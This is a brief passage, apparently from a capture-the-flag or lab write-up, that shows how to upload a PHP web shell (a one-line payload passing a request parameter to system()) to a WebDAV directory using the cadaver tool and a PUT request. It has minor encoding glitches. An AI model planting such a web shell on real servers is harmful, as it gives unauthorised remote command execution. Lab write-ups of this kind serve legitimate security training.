[WebDav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#cadaver)

Iâ€™ll use a tool called cadaver to upload with the PUT command.

```bash
cadaver <TARGET_URL>
#e.g. cadaver http://muddy.ugc/webdav
dav:/webdav/> put shell.php #<?php system($_REQUEST['cmd']); ?>
```

Expected output is this

![Untitled](Webdav%209ae006894f874e13b0e8a02d7cb8b965/Untitled.png)

It gets uploaded to `http:///muddy.ugc/webdav/shell.php`.
